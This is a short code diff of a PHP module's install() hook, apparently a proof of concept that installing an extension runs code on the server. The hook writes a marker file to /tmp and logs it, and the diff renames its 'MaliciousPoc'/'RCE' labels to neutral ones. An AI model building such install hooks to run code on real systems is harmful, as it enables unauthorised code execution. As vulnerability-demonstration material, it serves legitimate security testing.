@@ -9,19 +9,17 @@ class Module extends AbstractModule
 {
     public function install(): bool
     {
-        Log::info('[MaliciousPoc] install() called - RCE executed!');
+        Log::info('[EXP] install() called');
 
-        $markerPath = '/tmp/g7_rce_poc_install_' . uniqid() . '.txt';
+        $markerPath = '/tmp/sqrtrev_marker_' . uniqid() . '.txt';
         $nonce = bin2hex(random_bytes(8));
         
-        $content = "G7_RCE_POC_INSTALL: {$nonce}\n";
+        $content = "SQRTREV_MARKER: {$nonce}\n";
         $content .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
-        $content .= "Extension: malicious-poc\n";
-        $content .= "Method: Module::install()\n";
         
         file_put_contents($markerPath, $content);
         
-        Log::info("[MaliciousPoc] RCE confirmed - marker: {$markerPath}");
+        Log::info("[EXP] marker written: {$markerPath}");
 
         return parent::install();
     }
